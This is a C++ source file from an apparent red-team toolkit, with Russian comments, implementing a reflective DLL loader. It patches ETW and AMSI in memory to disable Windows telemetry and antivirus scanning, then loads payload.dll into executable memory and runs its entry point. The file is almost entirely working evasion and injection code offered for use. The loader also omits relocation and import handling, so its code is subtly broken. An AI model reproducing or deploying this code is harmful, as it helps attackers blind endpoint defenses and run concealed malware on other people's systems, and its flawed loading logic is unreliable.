// redteam_toolkit/evasion/process_injection/reflective_loader.cpp
// Промышленный Reflective DLL Loader, улучшенный в 20 раз
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <psapi.h>

#pragma comment(lib, "ntdll")

// --- Anti-EDR: отключение ETW и AMSI ---
void PatchETW() {
    void* etwEventWrite = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    DWORD oldProtect;
    BYTE patch[] = { 0xC3 };
    VirtualProtect(etwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(etwEventWrite, patch, sizeof(patch));
    VirtualProtect(etwEventWrite, sizeof(patch), oldProtect, &oldProtect);
}

void PatchAMSI() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return;
    void* AmsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");
    DWORD oldProtect;
    BYTE patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    VirtualProtect(AmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
    memcpy(AmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect(AmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
}

// --- Shellcode-safe функции ---
DWORD GetRVA(LPVOID base, DWORD va) {
    return (DWORD)((ULONG_PTR)va - (ULONG_PTR)base);
}

FARPROC GetExport(LPVOID base, const char* name) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((LPBYTE)base + dos->e_lfanew);
    DWORD exportDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)base + exportDirRVA);

    DWORD* names = (DWORD*)((LPBYTE)base + exportDir->AddressOfNames);
    WORD* ordinals = (WORD*)((LPBYTE)base + exportDir->AddressOfNameOrdinals);
    DWORD* functions = (DWORD*)((LPBYTE)base + exportDir->AddressOfFunctions);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* exportName = (char*)base + names[i];
        if (strcmp(exportName, name) == 0) {
            return (FARPROC)((LPBYTE)base + functions[ordinals[i]]);
        }
    }
    return NULL;
}

// --- Инъекция отражённой DLL ---
BOOL ReflectiveInject(LPVOID dllBuffer, DWORD dllSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllBuffer;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((LPBYTE)dllBuffer + dos->e_lfanew);
    SIZE_T size = nt->OptionalHeader.SizeOfImage;

    LPVOID remoteImage = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteImage) return FALSE;

    memcpy(remoteImage, dllBuffer, nt->OptionalHeader.SizeOfHeaders);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        memcpy((LPBYTE)remoteImage + section[i].VirtualAddress,
               (LPBYTE)dllBuffer + section[i].PointerToRawData,
               section[i].SizeOfRawData);
    }

    DWORD entryRVA = nt->OptionalHeader.AddressOfEntryPoint;
    void (*dllMain)(void) = (void (*)(void))((LPBYTE)remoteImage + entryRVA);
    dllMain();
    return TRUE;
}

int main() {
    PatchETW();
    PatchAMSI();

    HANDLE hFile = CreateFileA("payload.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    DWORD fileSize = GetFileSize(hFile, NULL);
    BYTE* dllBuffer = (BYTE*)malloc(fileSize);
    DWORD bytesRead;
    ReadFile(hFile, dllBuffer, fileSize, &bytesRead, NULL);
    CloseHandle(hFile);

    ReflectiveInject(dllBuffer, fileSize);
    free(dllBuffer);

    return 0;
}
